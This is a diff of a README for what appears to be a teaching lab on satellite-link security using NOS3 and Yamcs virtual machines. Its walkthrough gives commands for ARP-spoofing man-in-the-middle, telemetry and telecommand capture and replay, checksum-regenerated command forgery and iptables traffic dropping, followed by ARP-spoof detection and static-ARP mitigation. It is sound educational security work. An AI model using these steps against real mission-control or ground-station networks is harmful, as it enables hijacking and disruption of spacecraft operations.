@@ -1,28 +1,13 @@
 # CCSDS Satellite Cybersecurity Lab
 
-A reproducible laboratory for studying the security of satellite communications using **NOS3** and **Yamcs**.
+A reproducible laboratory for studying the security of satellite communications using NOS3 and Yamcs.
 
-The platform reproduces a simplified ground-to-space architecture composed of independent virtual machines representing a **Mission Control Center**, **Ground Station**, **Satellite**, and **Attacker**. It can be used to observe telemetry and telecommand traffic, perform network and protocol attacks, and evaluate defensive mechanisms in a controlled environment.
+The platform reproduces a simplified ground-to-space architecture composed of independent virtual machines representing a Mission Control Center, Ground Station, Satellite, and Attacker. It can be used to observe telemetry and telecommand traffic, perform network and protocol attacks, and evaluate defensive mechanisms in a controlled environment.
 
----
+The baseline scenario uses telecommands without SDLS and demonstrates interception, replay, command modification, communication disruption and network defenses.
 
-# Features
-
-- Reproducible deployment with Vagrant
-- Multi-VM satellite communication architecture
-- NOS3 satellite simulation
-- cFS Flight Software
-- Yamcs Mission Control
-- CCSDS Telemetry (TM) and Telecommands (TC)
-- Man-in-the-Middle attacks
-- Replay attacks
-- Telecommand forgery
-- Traffic dropping / Denial of Service
-- Detection and mitigation examples
-
----
-
-# Lab Architecture
+## Lab Architecture
+![Lab Architecture](newdefarch.PNG)
 
 The laboratory separates each major component into an independent virtual machine in order to reproduce a realistic communication chain.
 
@@ -34,43 +19,12 @@ The laboratory separates each major component into an independent virtual machin
 | `sat` | Satellite (NOS3) | SPACE-LAN | `192.168.20.10` |
 | `kali` | Attacker | MC-LAN | `192.168.10.40` |
 
-## Network Diagram
-
-![Lab Architecture](newdefarch.PNG)
-
-## NOS3 Internal Architecture
-
-*Faut rajouter internal NOS3 architecture diagram ici.*
-
-The satellite VM executes NOS3 through multiple Docker containers. The main components are:
-
-- cFS Flight Software
-- Radio Simulator
-- NOS Engine
-- 42 Dynamics Simulator
-- Truth42
-- Hardware simulators
-
-Telemetry flows from **cFS → Radio Simulator → Yamcs**, while telecommands follow the opposite direction.
-
----
-
-## Main Communication Flows
-
-| Flow | Protocol | Destination |
-|------|----------|-------------|
-| Truth Data | UDP 5111 | Yamcs |
-| Radio Telemetry | UDP 6011 | Yamcs |
-| Radio Telecommands | UDP 8010 | Radio Simulator |
-
----
 
 # Requirements
 
-## Supported Platforms
+## OS
 
 - Linux
-- Windows using WSL2
 
 ## Required Software
 
@@ -84,422 +38,235 @@ Ubuntu & Debian:
 sudo apt update
 sudo apt install -y git vagrant virtualbox
 ```
-
 ---
 
-# Installation & Deployment
+## Installation and Verification
 
-Clone the repository.
+ The VMs allocate **20 GiB of RAM** in total; adjust `vb.memory` and `vb.cpus` in the `Vagrantfile` to suit your computer, leaving resources for the host.
+
+Clone the repository, or open your existing checkout:
 
 ```bash
-git clone https://github.com/BaptisteBemel/satellite_lab_cybersecurity.git
-cd ccsds_satellite_cybersecurity_lab
+git clone https://github.com/BaptisteBemel/satellite_lab_cybersecurity.git 
+cd satellite_lab_cybersecurity
 ```
 
-Start the laboratory.
+Create and provision the laboratory:
 
 ```bash
 vagrant up
 ```
 
-The first deployment may take some time because NOS3 and Yamcs are built automatically.
+The first deployment may take some time. Provisioning installs the dependencies, prepares the clear telecommand receiver, builds NOS3 and Yamcs, and starts the laboratory services.
 
 ---
 
-## Verification
-
-Verify that the deployment completed successfully.
+Run the repository's verification script from the host. It checks connectivity, Yamcs availability and TM/TC traffic:
 
 ```bash
-./verification.sh
+bash verification.sh
 ```
 
-The verification script checks:
+Open **<http://localhost:8090>** and select the **nos3** instance and **realtime** processor.
 
-- VMs are running
-- Routing configuration
-- Docker containers
-- NOS3 services
-- Yamcs service
-- API availability
-- Telemetry flows
-- Radio configuration
+## Scenario — Attacker on the mission-control network
 
----
+An attacker has obtained access to the same network as mission control. Starting from Kali, the attacker intercepts communications between MC and the gateway, captures telemetry and commands, and attempts to replay or modify them. The attacker then interrupts selected traffic while the operator observes the effects in Yamcs and cFS.
 
-# Repository Structure
+The final part introduces ARP monitoring and static neighbor entries, allowing the same interception attempt to be repeated with defenses enabled.
 
-```text
-.
-├── attacks/
-├── defense/
-├── provisioning/
-├── captures/
-├── verification.sh
-├── Vagrantfile
-└── README.md
-```
+### Learning goals
 
-| Directory | Description |
-|-----------|-------------|
-| `attacks/` | Attack scripts |
-| `defense/` | Detection and mitigation utilities |
-| `provisioning/` | VM provisioning scripts |
-| `captures/` | Generated PCAPs and extracted traffic |
-| `verification.sh` | Platform verification |
-| `Vagrantfile` | Lab deployment |
+By completing this scenario, you should be able to:
 
----
-# Usage Scenarios
+- Establish a man-in-the-middle position using ARP spoofing.
+- Capture and replay satellite telemetry and telecommands.
+- Modify a command packet and distinguish a checksum from authentication.
+- Observe the effects of traffic disruption at mission control and onboard.
+- Detect ARP poisoning, apply static ARP protection and explain its limits.
 
-The following scenarios demonstrate the main attack and defense capabilities of the laboratory.
+### Walkthrough
 
----
+Commands identify where they run: Host or a guest opened with `vagrant ssh <name>`. Use separate terminals for commands that keep running. Examples use `eth1` on MC, GS's ground-facing side and Kali; check `ip -br addr` if your interface names differ.
 
-# Scenario 1 — Baseline Communication Analysis
+#### Step 1 — Intercept communications
 
-## Objective
+Before starting, note the legitimate MC and GS MAC addresses using `ip link show eth1` inside each VM. You will need them for the defense step.
 
-Establish a reference state before introducing attacks.
-
-This scenario verifies that:
-
-- Mission Control can receive telemetry.
-- The satellite simulation is operational.
-- Normal TM and TC communication paths are working.
-- Network behavior can be captured and analyzed.
-
-## Scripts involved
-
-| Script | Purpose |
-|--------|---------|
-| `defense/check_neighbors.sh` | Display legitimate network neighbors and MAC addresses |
-| `defense/capture_defense.sh` | Capture normal laboratory traffic |
-| `defense/analyze_pcap.py` | Generate a summary of captured traffic |
-| `defense/extract_tm_from_pcap.py` | Extract CCSDS telemetry frames |
-
-## Execution
-
-Check the network state:
+**Host, first terminal:** start ARP spoofing and leave it running.
 
 ```bash
-vagrant ssh mc -c "/vagrant/defense/check_neighbors.sh"
+vagrant ssh kali -c 'bash /vagrant/attacks/mitm_start.sh eth1'
 ```
 
-Capture baseline traffic:
+**Host, second terminal:** capture the intercepted traffic.
 
 ```bash
-vagrant ssh mc -c "/vagrant/defense/capture_defense.sh eth1 /vagrant/captures/baseline.pcap 10"
+vagrant ssh kali -c 'bash /vagrant/attacks/capture_satcom.sh eth1 /vagrant/captures/mitm.pcap 20'
 ```
 
-Analyze captured traffic:
+Inspect the neighbor tables on MC and GS:
 
 ```bash
-vagrant ssh mc -c "/vagrant/defense/analyze_pcap.py /vagrant/captures/baseline.pcap"
+vagrant ssh mc -c 'bash /vagrant/defense/check_neighbors.sh'
+vagrant ssh gs -c 'bash /vagrant/defense/check_neighbors.sh'
 ```
 
-Extract captured traffic:
+**Observe:** the affected neighbor mappings point to Kali's MAC. Open `captures/mitm.pcap` in Wireshark on the host to inspect the intercepted traffic.
+
+#### Step 2 — Replay telemetry
+
+Replay a small sample of the captured telemetry toward mission control.
+
+**Kali:**
 
 ```bash
-vagrant ssh mc -c "/vagrant/defense/extract_tm_from_pcap.py /vagrant/captures/baseline.pcap -o /vagrant/captures/baseline"
+python3 /vagrant/attacks/replay_radio_tm.py /vagrant/captures/mitm.pcap \
+    --dst-ip 192.168.10.20 --dst-port 6011 \
+    --allow-no-asm --limit 10 --delay 1
 ```
----
 
-# Scenario 2 — Man-in-the-Middle Attack
+**Observe:** compare Yamcs `radio-in` counters and decoded telemetry before and during replay. Check whether the replayed data is processed, rather than concluding success from packet arrival alone.
 
-## Objective
+#### Step 3 — Capture and replay a telecommand
 
-Place the attacker between Mission Control and the Ground Station in order to intercept bidirectional communication.
-
-The attack targets the Mission Control LAN and uses ARP spoofing to create a MITM position.
-
-The attacker can observe:
-
-- Telemetry
-- Telecommand
-
-## Scripts involved
-
-| Script | Purpose |
-|--------|---------|
-| `attacks/mitm_start.sh` | Launch bidirectional ARP spoofing |
-| `attacks/capture_satcom.sh` | Capture intercepted satellite communication |
-| `defense/detect_arp_spoof.py` | Detect ARP mapping changes |
-
-## Execution
-Start ARP spoofing from Kali:
+**Kali:** start a dedicated capture. While it runs, use Yamcs **Commanding → Send a command** to send `/CFS/CMD/CF_NOOP` once.
 
 ```bash
-vagrant ssh kali -c "/vagrant/attacks/mitm_start.sh eth1"
+bash /vagrant/attacks/capture_tc_commands.sh eth1 /vagrant/captures/tc_capture.pcap 20
 ```
 
-Capture intercepted traffic:
+Extract the command frames:
 
 ```bash
-vagrant ssh kali -c "/vagrant/attacks/capture_satcom.sh eth1 /vagrant/captures/mitm.pcap 15"
+python3 /vagrant/attacks/extract_tc_from_pcap.py \
+    /vagrant/captures/tc_capture.pcap --dport 8010 -o /vagrant/captures/tc_extracted
+ls /vagrant/captures/tc_extracted/payloads/
 ```
----
 
-# Scenario 3 — Telemetry Capture and Extraction
-
-## Objective
-
-Capture and extract telemetry frames from the attacker position.
-
-This scenario demonstrates that an attacker with network access can observe unprotected telemetry traffic.
-
-## Scripts involved
-
-| Script | Purpose |
-|--------|---------|
-| `attacks/capture_satcom.sh` | Capture telemetry traffic |
-| `defense/extract_tm_from_pcap.py` | Extract CADUs and TM Transfer Frames |
-| `defense/analyze_pcap.py` | Analyze captured traffic |
-
-## Execution
-
-Capture telemetry:
+Select the No-Op frame from this capture. Replace `FRAME_FILE` below with its [filename], then replay it:
 
 ```bash
-vagrant ssh kali -c "/vagrant/attacks/capture_satcom.sh eth1 /vagrant/captures/tm_capture.pcap 15"
+cp /vagrant/captures/tc_extracted/payloads/FRAME_FILE /vagrant/captures/noop-frame.bin
+python3 /vagrant/attacks/send_tc_payload.py /vagrant/captures/noop-frame.bin \
+    --dst-ip 192.168.20.10 --dst-port 8010 --count 1
 ```
 
-Extract telemetry frames:
+The extracted binary contains the complete frame. Use the binary for replay; the extractor's CSV packet-header interpretation assumes a bare packet and is not applicable to this frame format.
+
+**SAT:** look for a new execution after the replay:
 
 ```bash
-vagrant ssh mc -c "/vagrant/defense/extract_tm_from_pcap.py /vagrant/captures/tm_capture.pcap -o /vagrant/captures/tm_extracted"
+docker logs --timestamps --since 1m sc_1_nos_fsw 2>&1 | grep 'CF: No-Op received'
 ```
----
 
-# Scenario 4 — Telemetry Replay
+**Observe:** an additional No-Op event confirms that the replayed command was executed. Kali sends with its own source IP; the replay utility does not spoof MC's IP.
 
-## Objective
+#### Step 4 — Modify and inject a telecommand
 
-Replay previously captured telemetry toward Mission Control.
+The forging tool edits the inner cFS packet. For the 14-byte No-Op frame captured above, remove its six-byte frame envelope before editing, then put that envelope back. The command remains a No-Op; only its sequence count and checksum change.
 
-This scenario demonstrates the absence of telemetry authentication and anti-replay protection.
-
-## Scripts involved
-
-| Script | Purpose |
-|--------|---------|
-| `attacks/replay_radio_tm.py` | Replay captured telemetry frames |
-| `attacks/capture_satcom.sh` | Generate telemetry captures |
-
-## Execution
-
-Replay captured telemetry:
+**Kali:**
 
 ```bash
-vagrant ssh kali -c "/vagrant/attacks/replay_radio_tm.py /vagrant/captures/tm_capture.pcap --dst-ip 192.168.10.20 --dst-port 6011"
+# Extract the command packet.
+dd if=/vagrant/captures/noop-frame.bin of=/vagrant/captures/noop-packet.bin \
+    bs=1 skip=6 status=none
+
+# Change its sequence count and regenerate the checksum.
+python3 /vagrant/attacks/forge_tc_from_template.py /vagrant/captures/noop-packet.bin \
+    -o /vagrant/captures/modified-packet.bin --seq-count 42
+
+# Reattach the original envelope; the packet length is unchanged.
+head -c 6 /vagrant/captures/noop-frame.bin > /vagrant/captures/modified-frame.bin
+cat /vagrant/captures/modified-packet.bin >> /vagrant/captures/modified-frame.bin
+
+python3 /vagrant/attacks/send_tc_payload.py /vagrant/captures/modified-frame.bin \
+    --dst-ip 192.168.20.10 --dst-port 8010 --count 1
 ```
 
----
+Choose another sequence count if the original was already 42. Check the cFS log as in Step 3.
 
-# Scenario 5 — Telecommand Capture
+**Observe:** successful execution demonstrates acceptance of an attacker-modified command. Recalculating a checksum does not authenticate its sender.
 
-## Objective
+#### Step 5 — Interrupt communications
 
-Capture telecommands sent from Mission Control toward the simulated satellite.
+Keep the MITM running. These scripts drop traffic forwarded through Kali.
 
-This scenario demonstrates that unprotected telecommand traffic can be observed and extracted.
-
-## Scripts involved
-
-| Script | Purpose |
-|--------|---------|
-| `attacks/capture_tc_commands.sh` | Capture telecommand traffic |
-| `attacks/extract_tc_from_pcap.py` | Extract raw telecommand payloads |
-
-## Execution
-
-Capture telecommands:
+**Kali:** block radio telemetry and observe Yamcs `radio-in`:
 
 ```bash
-vagrant ssh kali -c "/vagrant/attacks/capture_tc_commands.sh eth1 /vagrant/captures/tc_capture.pcap 20"
+bash /vagrant/attacks/drop_radio_tm.sh
 ```
 
-Extract payloads:
+Remove that rule before testing telecommands:
 
 ```bash
-vagrant ssh kali -c "/vagrant/attacks/extract_tc_from_pcap.py /vagrant/captures/tc_capture.pcap -o /vagrant/captures/tc_extracted"
+sudo iptables -D FORWARD -p udp --dport 6011 -j DROP
+bash /vagrant/attacks/drop_tc_commands.sh
 ```
 
----
-
-# Scenario 6 — Telecommand Replay and Injection
-
-## Objective
-
-Inject previously captured telecommands into the satellite communication channel.
-
-This scenario demonstrates that captured commands can potentially be replayed without cryptographic authentication.
-
-## Scripts involved
-
-| Script | Purpose |
-|--------|---------|
-| `attacks/send_tc_payload.py` | Send raw telecommand payloads |
-| `attacks/extract_tc_from_pcap.py` | Extract command payloads |
-
-## Execution
-
-Send a captured telecommand:
+Send a legitimate No-Op from Yamcs and check whether it appears in the cFS log. Then restore the TC path:
 
 ```bash
-vagrant ssh kali -c "/vagrant/attacks/send_tc_payload.py /vagrant/captures/tc_extracted/payload.bin --dst-ip 192.168.20.10 --dst-port 8010"
+sudo iptables -D FORWARD -p udp --dport 8010 -j DROP
 ```
 
----
+**Observe:** radio TM stops during the first test; commands should not execute during the second. Send a new No-Op after removing the rule to confirm recovery. Debug telemetry and simulation truth can remain visible while radio TM is blocked.
 
-# Scenario 7 — Telecommand Forgery
+#### Step 6 — Detect and mitigate ARP poisoning
 
-## Objective
+Replace `GS_MAC` and `MC_MAC` in these examples with the legitimate addresses recorded in Step 1.
 
-Modify an existing telecommand and generate a new valid-looking command.
-
-This scenario demonstrates that a checksum alone does not provide cryptographic authentication.
-
-## Scripts involved
-
-| Script | Purpose |
-|--------|---------|
-| `attacks/forge_tc_from_template.py` | Modify TC fields and regenerate checksum |
-| `attacks/send_tc_payload.py` | Inject forged command |
-
-## Execution
-
-Generate a forged command:
+**MC:** start the detector while spoofing is active:
 
 ```bash
-vagrant ssh kali -c "/vagrant/attacks/forge_tc_from_template.py <input_tc.bin> -o forged_tc.bin --seq-count 42"
+sudo python3 -u /vagrant/defense/detect_arp_spoof.py \
+    --iface eth1 --expect 192.168.10.30=GS_MAC
 ```
 
-Inject the forged command:
+**Observe:** alerts identify ARP advertisements that disagree with the expected gateway address.
+
+Stop the MITM with **Ctrl+C** in its terminal. In separate guest terminals, install static entries:
+
+**MC:**
 
 ```bash
-vagrant ssh kali -c "/vagrant/attacks/send_tc_payload.py forged_tc.bin --dst-ip 192.168.20.10 --dst-port 8010"
+bash /vagrant/defense/static_arp_add.sh eth1 192.168.10.30 GS_MAC
 ```
 
----
-
-# Scenario 8 — Communication Disruption
-
-## Objective
-
-Interrupt telemetry or telecommand communication by dropping selected traffic.
-
-## Scripts involved
-
-| Script | Purpose |
-|--------|---------|
-| `attacks/drop_radio_tm.sh` | Drop telemetry traffic |
-| `attacks/drop_tc_commands.sh` | Drop telecommands |
-| `attacks/restore_forwarding.sh` | Restore normal forwarding |
-
-## Execution
-
-Drop telemetry:
+**GS:**
 
 ```bash
-vagrant ssh kali -c "/vagrant/attacks/drop_radio_tm.sh"
+bash /vagrant/defense/static_arp_add.sh eth1 192.168.10.20 MC_MAC
 ```
 
-Restore communication:
+Repeat Step 1's spoofing attempt and send a legitimate command from Yamcs.
+
+**Observe:** the trusted neighbor mappings should remain unchanged and legitimate communication should continue. Static ARP addresses this interception technique; it does not authenticate commands or prevent direct routed injection from Kali.
+
+#### Step 7 — Restore the baseline
+
+Stop the MITM and detector with **Ctrl+C**. Ensure the drop rules from Step 5 have been removed, then remove the static entries.
+
+**MC:**
 
 ```bash
-vagrant ssh kali -c "/vagrant/attacks/restore_forwarding.sh"
+bash /vagrant/defense/static_arp_del.sh eth1 192.168.10.30
+ping -c 1 192.168.10.30
 ```
 
----
-
-# Scenario 9 — Detection and Mitigation
-
-## Objective
-
-Evaluate defensive mechanisms against the implemented attacks.
-
-## Scripts involved
-
-| Script | Purpose |
-|--------|---------|
-| `defense/detect_arp_spoof.py` | Detect ARP poisoning |
-| `defense/static_arp_add.sh` | Configure static ARP entries |
-| `defense/static_arp_del.sh` | Remove static ARP entries |
-
-## Execution
-
-Start ARP monitoring:
+**GS:**
 
 ```bash
-vagrant ssh mc -c "sudo /vagrant/defense/detect_arp_spoof.py --iface eth1"
+bash /vagrant/defense/static_arp_del.sh eth1 192.168.10.20
+ping -c 1 192.168.10.20
 ```
 
-Enable static ARP protection:
+**Host:** run the verification script again:
 
 ```bash
-vagrant ssh mc -c "/vagrant/defense/static_arp_add.sh eth1 192.168.10.30 <GS_MAC>"
-vagrant ssh gs -c "/vagrant/defense/static_arp_add.sh eth1 192.168.10.20 <MC_MAC>"
+bash verification.sh
 ```
 
----
-
-# Troubleshooting
-
-
-## DNS issues
-
-Inside the VM:
-
-```bash
-sudo bash -c 'echo "nameserver 8.8.8.8" > /etc/resolv.conf'
-sudo apt update
-```
-
----
-
-
-## Docker storage full
-
-Check usage.
-
-```bash
-docker system df
-```
-
-Remove unused data.
-
-```bash
-docker system prune -af
-```
-
----
-
-# Cleanup
-
-Stop any running attacks.
-
-```bash
-vagrant ssh kali -c "sudo pkill arpspoof"
-```
-
-Restore forwarding.
-
-```bash
-vagrant ssh kali -c "./attacks/restore_forwarding.sh"
-```
-
-Disable IP forwarding.
-
-```bash
-vagrant ssh kali -c "sudo sysctl -w net.ipv4.ip_forward=0"
-```
-
-Flush ARP cache if necessary.
-
-```bash
-vagrant ssh mc -c "ip neigh flush all"
-vagrant ssh gs -c "ip neigh flush all"
-```
-
-
+Confirm that radio telemetry is received and a new legitimate No-Op produces a cFS event.
